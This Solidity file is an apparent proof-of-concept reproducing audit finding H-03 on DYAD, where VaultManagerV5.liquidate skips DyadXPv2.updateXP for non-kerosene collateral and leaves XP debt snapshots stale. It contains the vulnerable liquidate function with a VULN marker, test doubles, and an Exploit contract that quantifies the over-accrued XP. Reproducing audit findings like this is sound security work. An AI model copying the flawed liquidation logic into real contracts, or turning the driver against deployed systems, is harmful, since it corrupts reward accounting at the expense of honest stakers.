// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DYAD — `updateXP` can be omitted during liquidation
    Pashov Audit Group review — finding [H-03] (#41690) — HIGH
    Report: https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md
    In-scope source (audited commit 973cb961198890449e0a80b4be4065dccff0abc0):
        src/core/VaultManagerV5.sol      (liquidate — VERBATIM below)
        src/staking/DyadXPv2.sol         (updateXP / _computeXP — VERBATIM math below)

    ROOT CAUSE
    ----------
    VaultManagerV5.liquidate() burns part of a note's DYAD debt via
    `dyad.burn(id, msg.sender, amount)`. A note's DyadXPv2 XP accrues with a
    DEBT BONUS (bonus grows with `dyadMinted`), so whenever a note's debt
    changes its XP snapshot MUST be resynced via `dyadXP.updateXP(id)`.

    But `updateXP(id)`/`updateXP(to)` are only called INSIDE the collateral
    loop, guarded by `if (address(vault) == KEROSENE_VAULT)`. DYAD keeps a
    note's kerosene in a SEPARATE bounded kerosene-vault set; the general
    `vaults[id]` set iterated here contains only non-kerosene collateral
    (wETH, etc.). So when a liquidation seizes non-kerosene collateral, the
    `KEROSENE_VAULT` branch never matches, `updateXP` is NEVER called, and the
    note's DyadXPv2 snapshot keeps the PRE-liquidation (higher) `dyadMinted`.
    The liquidated note therefore keeps accruing XP at the inflated debt-bonus
    rate forever — over-crediting its XP and diluting every honest staker's
    share of kerosene rewards.

    HARM (accounting/integrity — no positive transfer to an attacker)
    -----------------------------------------------------------------
    After a partial liquidation that halves note `id`'s debt (1600e18 -> 800e18)
    by seizing wETH collateral:
      * on-chain `dyad.mintedDyad(id)`      == 800e18   (correct)
      * DyadXPv2 stored `noteData[id].dyadMinted` == 1600e18 (STALE — updateXP
        was omitted). The snapshot is provably out of sync with reality.
    `id` (bug) is compared against `refId`, an identical note whose XP snapshot
    WAS correctly resynced to the post-burn debt (i.e. the fixed behaviour).
    Over one day the buggy note over-accrues XP versus the correctly-synced
    reference. That excess XP — XP the note should never have earned — is minted
    to SINK 0x…D00d on a marker token as the quantified integrity loss.

    Faithful minimal doubles: real ERC20 accounting (Dyad, wETH, marker),
    real per-note collateral bookkeeping (Vault.id2asset / move), a licenser,
    a bounded kerosene vault, and DyadXPv2 with the VERBATIM audited
    `_computeXP` / `updateXP`. `liquidate` is reproduced VERBATIM from the
    finding; the omission point carries the `@> VULN` marker.

    Deterministic CREATE order in Exploit ctor (k-th `new` = child nonce k):
      1 Dyad            2 WETH(asset)     3 Oracle
      4 Vault(wETH)     5 KeroseneVault   6 VaultLicenser
      7 DyadXPv2        8 VaultManagerV5  <-- VULN contract (nonce 8)
      9 MarkerToken     <-- profit/marker token (nonce 9), minted to SINK
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////// math libraries ////////////////////////////*/

/// @dev Faithful floor/ceil fixed-point helpers (solmate FixedPointMathLib
///      semantics). Value ranges here stay well below 2**256 so the plain
///      product form is exact and identical to the assembly original.
library FixedPointMathLib {
    function mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return mulDivDown(x, y, 1e18);
    }

    function mulWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
        return mulDivUp(x, y, 1e18);
    }

    function divWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return mulDivDown(x, 1e18, y);
    }

    function divWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
        return mulDivUp(x, 1e18, y);
    }

    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }

    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256 z) {
        uint256 p = x * y;
        z = p / d;
        if (p % d != 0) z += 1; // ceil
    }
}

/// @dev Faithful OpenZeppelin Math.log10 (base-10 integer log). Present so the
///      VERBATIM `_computeXP` compiles; in this scenario totalXP == 0 so the
///      `totalXP > 0 ? … : 1e18` ternary short-circuits and log10 is not run.
library Math {
    function log10(uint256 value) internal pure returns (uint256 result) {
        unchecked {
            if (value >= 10 ** 64) { value /= 10 ** 64; result += 64; }
            if (value >= 10 ** 32) { value /= 10 ** 32; result += 32; }
            if (value >= 10 ** 16) { value /= 10 ** 16; result += 16; }
            if (value >= 10 ** 8)  { value /= 10 ** 8;  result += 8; }
            if (value >= 10 ** 4)  { value /= 10 ** 4;  result += 4; }
            if (value >= 10 ** 2)  { value /= 10 ** 2;  result += 2; }
            if (value >= 10 ** 1)  { result += 1; }
        }
    }
}

/// @dev Minimal faithful OZ EnumerableSet.AddressSet (add / length / at /
///      contains) — the container `vaults[id]` uses in the VERBATIM liquidate.
library EnumerableSet {
    struct AddressSet {
        address[] _values;
        mapping(address => uint256) _indexes; // 1-based; 0 == absent
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        if (set._indexes[value] != 0) return false;
        set._values.push(value);
        set._indexes[value] = set._values.length;
        return true;
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return set._indexes[value] != 0;
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return set._values.length;
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return set._values[index];
    }
}

/*//////////////////////////// ERC20 doubles /////////////////////////////*/

/// @dev Minimal ERC20 with real balance accounting.
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: burn exceeds balance");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev DYAD stablecoin double. Tracks per-note minted debt (`mintedDyad`)
///      exactly as the real Dyad token, and burns/mints the ERC20 alongside.
contract Dyad is ERC20 {
    address public vaultManager;
    mapping(uint256 => uint256) public mintedDyad; // noteId => debt

    constructor() ERC20("DYAD", "DYAD", 18) {}

    function setManager(address m) external {
        vaultManager = m;
    }

    modifier onlyVaultManager() {
        require(msg.sender == vaultManager, "Dyad: not manager");
        _;
    }

    /// @notice Mint debt against a note and issue the DYAD tokens to `to`.
    function mint(uint256 id, address to, uint256 amount) external onlyVaultManager {
        mintedDyad[id] += amount;
        _mint(to, amount);
    }

    /// @notice Burn `amount` DYAD from `from` and reduce note `id`'s debt.
    function burn(uint256 id, address from, uint256 amount) external onlyVaultManager {
        mintedDyad[id] -= amount;
        _burn(from, amount);
    }

    /// @notice Debt-only bookkeeping setter (models a note that borrowed DYAD
    ///         elsewhere; used only to seed the XP-reference note `refId`).
    function setMintedDyad(uint256 id, uint256 amount) external onlyVaultManager {
        mintedDyad[id] = amount;
    }
}

/// @dev Marker token used to quantify the silent integrity loss at SINK.
contract MarkerToken is ERC20 {
    constructor() ERC20("DYAD-XP-OVERACCRUAL", "XP-LOSS", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////// vault doubles /////////////////////////////*/

/// @dev Chainlink-style oracle double (8 decimals).
contract Oracle {
    uint8 public constant decimals = 8;
}

/// @dev Collateral vault double (e.g. wETH). Real per-note asset accounting;
///      `move` transfers collateral accounting between notes exactly like the
///      real Vault.move. USD valuation mirrors DYAD's Vault.getUsdValue.
contract Vault {
    address public vaultManager;
    ERC20 private _asset;
    Oracle private _oracle;
    uint256 private _price; // in oracle decimals (e.g. 2000e8)

    mapping(uint256 => uint256) public id2asset; // noteId => collateral amount

    constructor(ERC20 asset_, Oracle oracle_, uint256 price_) {
        _asset = asset_;
        _oracle = oracle_;
        _price = price_;
    }

    function setManager(address m) external {
        vaultManager = m;
    }

    modifier onlyVaultManager() {
        require(msg.sender == vaultManager, "Vault: not manager");
        _;
    }

    function asset() external view returns (ERC20) {
        return _asset;
    }

    function oracle() external view returns (Oracle) {
        return _oracle;
    }

    function assetPrice() public view returns (uint256) {
        return _price;
    }

    /// @notice USD value of note `id`'s deposit, 18-decimal fixed point —
    ///         faithful to DYAD Vault.getUsdValue.
    function getUsdValue(uint256 id) public view returns (uint256) {
        return (id2asset[id] * assetPrice() * 1e18) / (10 ** _oracle.decimals()) / (10 ** _asset.decimals());
    }

    /// @notice Move `amount` of collateral accounting from note `from` to `to`.
    function move(uint256 from, uint256 to, uint256 amount) external onlyVaultManager {
        require(id2asset[from] >= amount, "Vault: move exceeds deposit");
        id2asset[from] -= amount;
        id2asset[to] += amount;
    }

    /// @notice Test-setup deposit (models a user depositing collateral).
    function seedDeposit(uint256 id, uint256 amount) external {
        id2asset[id] += amount;
    }
}

/// @dev Bounded kerosene vault double. DyadXPv2 reads a note's kerosene
///      position from here via `id2asset`. Kerosene lives in this SEPARATE
///      set — it is NOT in the general `vaults[id]` set iterated by liquidate,
///      which is precisely why liquidate never hits the `KEROSENE_VAULT`
///      branch and omits `updateXP`.
contract KeroseneVault {
    mapping(uint256 => uint256) public id2asset;

    function seedDeposit(uint256 id, uint256 amount) external {
        id2asset[id] += amount;
    }
}

/// @dev Vault licenser double.
contract VaultLicenser {
    mapping(address => bool) public isLicensed;

    function license(address v, bool ok) external {
        isLicensed[v] = ok;
    }
}

/*//////////////////////////// DyadXPv2 (audited XP) //////////////////////*/

/// @notice DyadXPv2 XP-staking accounting. `updateXP` and `_computeXP` are
///         reproduced VERBATIM from the audited source (commit 973cb96). The
///         bug is NOT here — it is that VaultManagerV5.liquidate fails to CALL
///         `updateXP` after changing a note's debt, leaving `dyadMinted` stale.
contract DyadXPv2 {
    using FixedPointMathLib for uint256;
    using Math for uint256;

    struct NoteXPData {
        uint40 lastAction;
        uint96 keroseneDeposited;
        uint120 lastXP;
        uint256 totalXP;
        uint256 dyadMinted;
    }

    KeroseneVault public immutable KEROSENE_VAULT;
    Dyad public immutable DYAD;
    address public vaultManager;

    mapping(uint256 => NoteXPData) public noteData;

    constructor(KeroseneVault kero, Dyad dyad) {
        KEROSENE_VAULT = kero;
        DYAD = dyad;
    }

    function setManager(address m) external {
        vaultManager = m;
    }

    modifier onlyVaultManager() {
        require(msg.sender == vaultManager, "XP: not manager");
        _;
    }

    // Playground clock injection (the browser EVM cannot vm.warp): time is set
    // explicitly via setNow so the driver can elapse 1 day deterministically.
    // The verbatim XP accounting below is unchanged — only the two block.timestamp
    // reads are routed through _now().
    uint256 public nowTs;
    function setNow(uint256 t) external { nowTs = t; }
    function _now() internal view returns (uint256) { return nowTs == 0 ? block.timestamp : nowTs; }

    // ------------------- VERBATIM audited XP accounting -------------------

    function updateXP(uint256 noteId) external onlyVaultManager {
        NoteXPData memory lastUpdate = noteData[noteId];
        uint256 newXP = _computeXP(lastUpdate);

        noteData[noteId] = NoteXPData({
            lastAction: uint40(_now()),
            keroseneDeposited: uint96(KEROSENE_VAULT.id2asset(noteId)),
            lastXP: uint120(newXP),
            totalXP: lastUpdate.totalXP,
            dyadMinted: DYAD.mintedDyad(noteId)
        });
    }

    function balanceOfNote(uint256 noteId) public view returns (uint256) {
        NoteXPData memory lastUpdate = noteData[noteId];
        return _computeXP(lastUpdate);
    }

    function _computeXP(NoteXPData memory lastUpdate) internal view returns (uint256) {
        uint256 elapsed = _now() - lastUpdate.lastAction;
        uint256 deposited = lastUpdate.keroseneDeposited;
        uint256 dyadMinted = lastUpdate.dyadMinted;
        uint256 totalXP = lastUpdate.totalXP;

        uint256 accrualRateModifier = totalXP > 0 ? 1e18 / totalXP.log10() : 1e18;

        uint256 adjustedAccrualRate = accrualRateModifier * 1e7;

        // bonus = deposited + deposited * (dyadMinted / (dyadMinted + deposited))
        uint256 bonus = deposited;

        if (dyadMinted + deposited != 0) {
            bonus += deposited.mulWadDown(dyadMinted.divWadDown(dyadMinted + deposited));
        }

        return uint256(lastUpdate.lastXP + (elapsed * adjustedAccrualRate * bonus) / 1e18);
    }
}

/*//////////////////////////// VaultManagerV5 (VULN) /////////////////////*/

/// @notice Reduced VaultManagerV5. `liquidate` is reproduced VERBATIM from the
///         finding; supporting helpers/state are faithful minimal doubles.
contract VaultManagerV5 {
    using EnumerableSet for EnumerableSet.AddressSet;
    using FixedPointMathLib for uint256;

    uint256 public constant MIN_COLLAT_RATIO = 1.5e18; // 150%
    uint256 public constant LIQUIDATION_REWARD = 0.2e18; // 20%

    Dyad public dyad;
    VaultLicenser public vaultLicenser;
    DyadXPv2 public dyadXP;
    address public immutable KEROSENE_VAULT;

    mapping(uint256 => EnumerableSet.AddressSet) internal vaults; // noteId => collateral vaults
    mapping(uint256 => bool) internal _validNote;
    mapping(uint256 => uint256) public lastDeposit;

    event Liquidate(uint256 indexed id, address indexed from, uint256 indexed to, uint256 amount);

    constructor(Dyad dyad_, VaultLicenser licenser_, DyadXPv2 xp_, address keroseneVault_) {
        dyad = dyad_;
        vaultLicenser = licenser_;
        dyadXP = xp_;
        KEROSENE_VAULT = keroseneVault_;
    }

    modifier isValidDNft(uint256 id) {
        require(_validNote[id], "invalid dNft");
        _;
    }

    // ---------------------------- test wiring ----------------------------

    function registerNote(uint256 id) external {
        _validNote[id] = true;
    }

    function addVault(uint256 id, address vault) external {
        vaults[id].add(vault);
    }

    /// @notice Models any XP-syncing user action (deposit/mint/withdraw) that
    ///         the real VaultManager routes through `dyadXP.updateXP`.
    function syncXP(uint256 id) external {
        dyadXP.updateXP(id);
    }

    /// @notice Mint debt against a note and issue DYAD to `to` (the manager is
    ///         the only actor allowed to move debt in the real system).
    function seedDebt(uint256 id, address to, uint256 amount) external {
        dyad.mint(id, to, amount);
    }

    /// @notice Debt-only setter routed through the manager (reference note).
    function setDebt(uint256 id, uint256 amount) external {
        dyad.setMintedDyad(id, amount);
    }

    function getTotalValue(uint256 id) public view returns (uint256 total) {
        uint256 n = vaults[id].length();
        for (uint256 i = 0; i < n; i++) {
            Vault v = Vault(vaults[id].at(i));
            if (vaultLicenser.isLicensed(address(v))) {
                total += v.getUsdValue(id);
            }
        }
    }

    function collatRatio(uint256 id) public view returns (uint256) {
        uint256 debt = dyad.mintedDyad(id);
        if (debt == 0) return type(uint256).max;
        return getTotalValue(id).divWadDown(debt);
    }

    // ----------------------- VERBATIM vulnerable fn ----------------------

    function liquidate(uint256 id, uint256 to, uint256 amount)
        external
        isValidDNft(id)
        isValidDNft(to)
        returns (address[] memory, uint256[] memory)
    {
        uint256 cr = collatRatio(id);
        if (cr >= MIN_COLLAT_RATIO) revert CrTooHigh();
        uint256 debt = dyad.mintedDyad(id);
        dyad.burn(id, msg.sender, amount); // changes `debt` and `cr`

        lastDeposit[to] = block.number; // `move` acts like a deposit

        uint256 numberOfVaults = vaults[id].length();
        address[] memory vaultAddresses = new address[](numberOfVaults);
        uint256[] memory vaultAmounts = new uint256[](numberOfVaults);

        uint256 totalValue = getTotalValue(id);
        if (totalValue == 0) return (vaultAddresses, vaultAmounts);

        for (uint256 i = 0; i < numberOfVaults; i++) {
            Vault vault = Vault(vaults[id].at(i));
            vaultAddresses[i] = address(vault);
            if (vaultLicenser.isLicensed(address(vault))) {
                uint256 depositAmount = vault.id2asset(id);
                if (depositAmount == 0) continue;
                uint256 value = vault.getUsdValue(id);
                uint256 asset;
                if (cr < LIQUIDATION_REWARD + 1e18 && debt != amount) {
                    uint256 cappedCr = cr < 1e18 ? 1e18 : cr;
                    uint256 liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);
                    uint256 liquidationAssetShare = (liquidationEquityShare + 1e18).divWadDown(cappedCr);
                    uint256 allAsset = depositAmount.mulWadUp(liquidationAssetShare);
                    asset = allAsset.mulWadDown(amount).divWadDown(debt);
                } else {
                    uint256 share = value.divWadDown(totalValue);
                    uint256 amountShare = share.mulWadUp(amount);
                    uint256 reward_rate = amount.divWadDown(debt).mulWadDown(LIQUIDATION_REWARD);
                    uint256 valueToMove = amountShare + amountShare.mulWadUp(reward_rate);
                    uint256 cappedValue = valueToMove > value ? value : valueToMove;
                    asset = cappedValue * (10 ** (vault.oracle().decimals() + vault.asset().decimals()))
                        / vault.assetPrice() / 1e18;
                }
                vaultAmounts[i] = asset;

                vault.move(id, to, asset);
                if (address(vault) == KEROSENE_VAULT) { // @> VULN: updateXP only runs for the KEROSENE_VAULT branch; a non-kerosene seizure leaves noteData[id].dyadMinted stale after dyad.burn changed the debt
                    dyadXP.updateXP(id);
                    dyadXP.updateXP(to);
                }
            }
        }

        emit Liquidate(id, msg.sender, to, amount);

        return (vaultAddresses, vaultAmounts);
    }

    error CrTooHigh();
}

/*////////////////////////////// exploit driver //////////////////////////*/

/// @notice Reproduces the omitted-updateXP integrity bug end-to-end. The
///         constructor deploys + wires the system and performs the liquidation
///         at t0; the driver warps 1 day and calls run(), which quantifies the
///         XP the liquidated note wrongly over-accrues and marks it at SINK.
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant ID = 1; // liquidated (victim) note
    uint256 internal constant TO = 2; // liquidator note
    uint256 internal constant REF = 3; // XP reference: identical note, correctly resynced

    uint256 internal constant KERO_DEPOSIT = 1_000e18; // note's kerosene position (drives XP)
    uint256 internal constant WETH_DEPOSIT = 1e18; // 1 wETH collateral ($2000)
    uint256 internal constant PRICE = 2_000e8; // wETH/USD, 8 decimals
    uint256 internal constant INIT_DEBT = 1_600e18; // pre-liquidation debt
    uint256 internal constant LIQ_AMOUNT = 800e18; // debt burned by liquidation
    uint256 internal constant POST_DEBT = 800e18; // = INIT_DEBT - LIQ_AMOUNT

    Dyad public dyad;
    ERC20 public weth;
    Oracle public oracle;
    Vault public vault;
    KeroseneVault public kero;
    VaultLicenser public licenser;
    DyadXPv2 public xp;
    VaultManagerV5 public vm;
    MarkerToken public marker;

    uint256 public staleXP; // balanceOfNote(id) — accrues on the stale (higher) debt
    uint256 public correctXP; // balanceOfNote(refId) — accrues on the true (lower) debt
    uint256 public excessXP; // staleXP - correctXP  (XP the note should never have earned)
    uint256 public storedDyadMinted; // DyadXPv2 snapshot for id (stale)
    uint256 public actualDebt; // dyad.mintedDyad(id) (true)

    constructor() {
        // ---- deterministic CREATE order (child nonce = new order) ----
        dyad = new Dyad(); // 1
        weth = new ERC20("Wrapped Ether", "WETH", 18); // 2
        oracle = new Oracle(); // 3
        vault = new Vault(weth, oracle, PRICE); // 4
        kero = new KeroseneVault(); // 5
        licenser = new VaultLicenser(); // 6
        xp = new DyadXPv2(kero, dyad); // 7
        vm = new VaultManagerV5(dyad, licenser, xp, address(kero)); // 8  <-- VULN
        marker = new MarkerToken(); // 9  <-- profit/marker

        // ---- wire managers ----
        dyad.setManager(address(vm));
        vault.setManager(address(vm));
        xp.setManager(address(vm));
    }

    function run() external {
        // The setup + the VERBATIM vulnerable liquidation run INSIDE the attack
        // call so the Playground records VaultManagerV5's executed lines (its
        // locators resolve). t0 is the attack-block timestamp; the snapshots
        // below anchor lastAction to _now()==block.timestamp==t0.
        uint256 t0 = block.timestamp;

        // ---- register notes ----
        vm.registerNote(ID);
        vm.registerNote(TO);
        vm.registerNote(REF);

        // ---- victim note `id`: kerosene position + debt + wETH collateral ----
        kero.seedDeposit(ID, KERO_DEPOSIT); // XP-bearing kerosene (in the bounded set)
        vm.seedDebt(ID, address(this), INIT_DEBT); // debt 1600e18; DYAD tokens to liquidator
        vault.seedDeposit(ID, WETH_DEPOSIT); // 1 wETH collateral
        licenser.license(address(vault), true); // wETH vault is licensed collateral
        vm.addVault(ID, address(vault)); // ONLY non-kerosene collateral in vaults[id]
        vm.syncXP(ID); // snapshot: dyadMinted = 1600e18, keroseneDeposited = 1000e18

        // ---- reference note `refId`: identical, but CORRECTLY resynced ----
        //      Models the fixed behaviour: after the debt is reduced, updateXP
        //      is called so the snapshot reflects the post-burn debt (800e18).
        kero.seedDeposit(REF, KERO_DEPOSIT);
        vm.setDebt(REF, INIT_DEBT); // start at same 1600e18
        vm.syncXP(REF); // snapshot dyadMinted = 1600e18
        vm.setDebt(REF, POST_DEBT); // debt reduced (as liquidation does)
        vm.syncXP(REF); // FIX: resync -> snapshot dyadMinted = 800e18

        // ---- perform the actual liquidation of `id` (VERBATIM liquidate) ----
        //      Seizes wETH collateral; because the seized vault != KEROSENE_VAULT
        //      the `updateXP(id)` call is OMITTED -> noteData[id].dyadMinted
        //      stays 1600e18 while the real debt drops to 800e18.
        vm.liquidate(ID, TO, LIQ_AMOUNT);

        // ---- elapse 1 day deterministically (browser EVM cannot vm.warp) ----
        //      elapsed = (t0 + 1 days) - t0 = 86400, independent of host time,
        //      so gate-1 and Playground magnitudes match.
        xp.setNow(t0 + 1 days);

        // ---- primary harm: the XP snapshot is provably out of sync ----
        actualDebt = dyad.mintedDyad(ID); // 800e18 (true)
        (, , , , storedDyadMinted) = xp.noteData(ID); // 1600e18 (stale — updateXP omitted)
        require(actualDebt == POST_DEBT, "liquidation did not reduce debt");
        require(storedDyadMinted == INIT_DEBT, "expected stale snapshot debt");
        require(storedDyadMinted != actualDebt, "snapshot not stale: no bug");

        // ---- quantified harm: over-accrued XP after time passes ----
        //      (driver has warped 1 day past the t0 snapshots.)
        staleXP = xp.balanceOfNote(ID); // accrues with stale bonus(K, 1600e18)
        correctXP = xp.balanceOfNote(REF); // accrues with true  bonus(K,  800e18)
        require(staleXP > correctXP, "no over-accrual");
        excessXP = staleXP - correctXP;
        require(excessXP > 0, "zero excess");

        // ---- mark the integrity loss (over-credited XP) at SINK ----
        marker.mint(SINK, excessXP);
        require(marker.balanceOf(SINK) == excessXP, "sink not marked");
    }
}
